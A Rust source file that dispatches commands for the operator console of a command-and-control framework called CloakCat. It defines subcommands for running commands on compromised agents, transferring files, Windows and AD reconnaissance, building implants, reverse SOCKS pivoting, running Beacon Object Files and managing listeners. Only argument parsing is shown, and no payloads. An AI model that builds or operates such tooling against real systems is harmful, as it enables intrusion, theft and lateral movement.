//! REPL command dispatch — clap-based parsing with modular handlers.

use std::path::PathBuf;
use std::sync::atomic::AtomicBool;
use std::sync::Arc;

use anyhow::Result;
use clap::{CommandFactory, Parser, Subcommand};
use reqwest::blocking::Client;

use crate::build::Os;

mod agent;
mod bof;
mod build;
mod listener;
mod recon;
mod socks;
mod task;
mod transfer;

pub enum Flow {
    Continue,
    Quit,
}

/// Shared context passed to every command handler.
pub struct CliCtx<'a> {
    pub cli: &'a Client,
    pub base: &'a str,
    pub cancel: Arc<AtomicBool>,
}

#[derive(Parser)]
#[command(name = "", no_binary_name = true, disable_help_subcommand = true)]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// List all agents
    Agents,

    /// Send command to agent
    #[command(trailing_var_arg = true)]
    Attack {
        /// Agent ID or alias
        agent: String,
        /// Command to execute on target
        #[arg(required = true, num_args = 1.., allow_hyphen_values = true)]
        command: Vec<String>,
    },

    /// Set agent alias
    #[command(trailing_var_arg = true)]
    Alias {
        /// Agent ID
        agent: String,
        /// New alias
        #[arg(required = true, num_args = 1.., allow_hyphen_values = true)]
        alias: Vec<String>,
    },

    /// Show results for agent
    Results {
        /// Agent ID or alias
        agent: String,
        /// Max results to show
        #[arg(long, default_value_t = 20)]
        limit: usize,
        /// Show full stdout without truncating
        #[arg(long)]
        full: bool,
    },

    /// Follow recent results (Ctrl+C to stop)
    Tail {
        /// Agent ID or alias
        agent: String,
        /// Poll interval in seconds
        #[arg(long, default_value_t = 2)]
        interval: u64,
    },

    /// Download small file via PowerShell base64
    DownloadSmall {
        /// Agent ID or alias
        agent: String,
        /// Remote file path on target
        remote_path: String,
        /// Local destination path
        local_path: String,
    },

    /// Upload small file via PowerShell base64
    UploadSmall {
        /// Agent ID or alias
        agent: String,
        /// Local file to upload
        local_path: String,
        /// Remote destination path on target
        remote_path: String,
    },

    /// Upload file to agent via chunked transfer (up to 50 MB)
    Upload {
        /// Agent ID or alias
        agent: String,
        /// Local file to upload
        local_path: String,
        /// Remote destination path on target
        remote_path: String,
    },

    /// Download file from agent via chunked transfer (up to 50 MB)
    Download {
        /// Agent ID or alias
        agent: String,
        /// Remote file path on target
        remote_path: String,
        /// Local destination path (defaults to filename)
        local_path: Option<String>,
    },

    /// Low-noise Windows recon
    ReconLow {
        /// Agent ID or alias
        agent: String,
    },

    /// Noisy AD recon (whoami /all, net user /domain, nltest /dclist)
    ReconNoisy {
        /// Agent ID or alias
        agent: String,
    },

    /// Show recent results timeline for agent
    History {
        /// Agent ID or alias
        agent: String,
        /// Max results to show
        #[arg(long, default_value_t = 20)]
        limit: usize,
    },

    /// Show audit log
    Audit {
        /// Max entries to show
        #[arg(long, default_value_t = 50)]
        limit: i64,
        /// Filter by actor name
        #[arg(long)]
        actor: Option<String>,
        /// Filter by agent ID or alias
        #[arg(long)]
        agent: Option<String>,
    },

    /// Cleanup CloakCat agent on Windows host
    CleanupWindows {
        /// Agent ID or alias
        agent: String,
    },

    /// Basic host information (Windows)
    Hostinfo {
        /// Agent ID or alias
        agent: String,
    },

    /// Basic network information (Windows)
    Netinfo {
        /// Agent ID or alias
        agent: String,
    },

    /// Show agent tags
    Tags {
        /// Agent ID or alias
        agent: String,
    },

    /// Add a tag to agent
    TagAdd {
        /// Agent ID or alias
        agent: String,
        /// Tag to add
        tag: String,
    },

    /// Remove a tag from agent
    TagRemove {
        /// Agent ID or alias
        agent: String,
        /// Tag to remove
        tag: String,
    },

    /// List agents with tags, optionally filtered by tag
    AgentsTags {
        /// Filter by this tag
        tag: Option<String>,
    },

    /// Build agent binary
    BuildAgent {
        /// Target OS (linux | windows)
        #[arg(long)]
        os: Os,
        /// Agent alias
        #[arg(long)]
        alias: String,
        /// C2 server URL
        #[arg(long)]
        c2_url: String,
        /// Health profile name
        #[arg(long)]
        profile: String,
        /// Shared authentication token
        #[arg(long)]
        shared_token: String,
        /// Output directory for built binary
        #[arg(long)]
        output_dir: PathBuf,
        /// Output binary name
        #[arg(long)]
        name: String,
        /// Optional note
        #[arg(long)]
        note: Option<String>,
    },

    /// Start reverse SOCKS5 listener for an agent
    SocksStart {
        /// Agent ID or alias
        agent: String,
        /// Local port for the SOCKS5 listener on the C2 server
        port: u16,
    },

    /// Stop reverse SOCKS5 listener for an agent
    SocksStop {
        /// Agent ID or alias
        agent: String,
    },

    /// List active reverse SOCKS5 listeners
    SocksList,

    /// Execute a Beacon Object File (BOF) on an agent
    Bof {
        /// Agent ID or alias
        agent: String,
        /// Path to local .o file
        bof_file: String,
        /// Base64-encoded BOF arguments (optional)
        #[arg(long)]
        args: Option<String>,
    },

    /// List active C2 listeners
    ListenersList,

    /// Add a new C2 listener at runtime
    ListenersAdd {
        /// Unique listener name
        #[arg(long)]
        name: String,
        /// Listener type: http or https
        #[arg(long, default_value = "https")]
        r#type: String,
        /// Bind host address
        #[arg(long, default_value = "0.0.0.0")]
        host: String,
        /// TCP port
        #[arg(long)]
        port: u16,
        /// Malleable C2 profile name
        #[arg(long)]
        profile: String,
    },

    /// Remove (stop) a C2 listener by name
    ListenersRemove {
        /// Listener name to remove
        name: String,
    },

    /// Show available commands
    #[command(alias = "h")]
    Help,

    /// Exit CLI
    #[command(alias = "exit")]
    Quit,
}

pub fn dispatch(
    cli: &Client,
    base: &str,
    line: &str,
    cancel: Arc<AtomicBool>,
) -> Result<Flow> {
    let mut parts = shell_words::split(line).map_err(|e| anyhow::anyhow!("parse: {e}"))?;
    if parts.is_empty() {
        return Ok(Flow::Continue);
    }
    // Case-insensitive subcommand matching (preserve argument case).
    parts[0] = parts[0].to_lowercase();

    let parsed = match Cli::try_parse_from(&parts) {
        Ok(c) => c,
        Err(e) => {
            e.print().ok();
            return Ok(Flow::Continue);
        }
    };

    let ctx = CliCtx { cli, base, cancel };

    match parsed.cmd {
        // --- agent ---
        Cmd::Agents => agent::cmd_agents(&ctx)?,
        Cmd::Alias { agent, alias } => agent::cmd_alias(&ctx, &agent, alias)?,
        Cmd::Tags { agent } => agent::cmd_tags(&ctx, &agent)?,
        Cmd::TagAdd { agent, tag } => agent::cmd_tag_add(&ctx, &agent, &tag)?,
        Cmd::TagRemove { agent, tag } => agent::cmd_tag_remove(&ctx, &agent, &tag)?,
        Cmd::AgentsTags { tag } => agent::cmd_agents_tags(&ctx, tag.as_deref())?,

        // --- recon / attack ---
        Cmd::Attack { agent, command } => recon::cmd_attack(&ctx, &agent, command)?,
        Cmd::DownloadSmall {
            agent,
            remote_path,
            local_path,
        } => recon::cmd_download_small(&ctx, &agent, &remote_path, &local_path)?,
        Cmd::UploadSmall {
            agent,
            local_path,
            remote_path,
        } => recon::cmd_upload_small(&ctx, &agent, &local_path, &remote_path)?,

        // --- chunked transfer ---
        Cmd::Upload {
            agent,
            local_path,
            remote_path,
        } => transfer::cmd_upload(&ctx, &agent, &local_path, &remote_path)?,
        Cmd::Download {
            agent,
            remote_path,
            local_path,
        } => transfer::cmd_download(&ctx, &agent, &remote_path, local_path.as_deref())?,
        Cmd::ReconLow { agent } => recon::cmd_recon_low(&ctx, &agent)?,
        Cmd::ReconNoisy { agent } => recon::cmd_recon_noisy(&ctx, &agent)?,
        Cmd::CleanupWindows { agent } => recon::cmd_cleanup_windows(&ctx, &agent)?,
        Cmd::Hostinfo { agent } => recon::cmd_hostinfo(&ctx, &agent)?,
        Cmd::Netinfo { agent } => recon::cmd_netinfo(&ctx, &agent)?,

        // --- task / results ---
        Cmd::Results { agent, limit, full } => task::cmd_results(&ctx, &agent, limit, full)?,
        Cmd::History { agent, limit } => task::cmd_history(&ctx, &agent, limit)?,
        Cmd::Audit {
            limit,
            actor,
            agent,
        } => task::cmd_audit(&ctx, limit, actor.as_deref(), agent.as_deref())?,
        Cmd::Tail { agent, interval } => task::cmd_tail(&ctx, &agent, interval)?,

        // --- build ---
        Cmd::BuildAgent {
            os,
            alias,
            c2_url,
            profile,
            shared_token,
            output_dir,
            name,
            note,
        } => build::cmd_build_agent(os, alias, c2_url, profile, shared_token, output_dir, name, note)?,

        // --- bof ---
        Cmd::Bof { agent, bof_file, args } => bof::cmd_bof(&ctx, &agent, &bof_file, args.as_deref())?,

        // --- socks ---
        Cmd::SocksStart { agent, port } => socks::cmd_socks_start(&ctx, &agent, port)?,
        Cmd::SocksStop { agent } => socks::cmd_socks_stop(&ctx, &agent)?,
        Cmd::SocksList => socks::cmd_socks_list(&ctx)?,

        // --- listener management ---
        Cmd::ListenersList => listener::cmd_listeners_list(&ctx)?,
        Cmd::ListenersAdd { name, r#type, host, port, profile } => {
            listener::cmd_listeners_add(&ctx, &name, &r#type, &host, port, &profile)?
        }
        Cmd::ListenersRemove { name } => listener::cmd_listeners_remove(&ctx, &name)?,

        // --- misc ---
        Cmd::Help => {
            Cli::command().print_help().ok();
            println!();
        }
        Cmd::Quit => return Ok(Flow::Quit),
    }

    Ok(Flow::Continue)
}
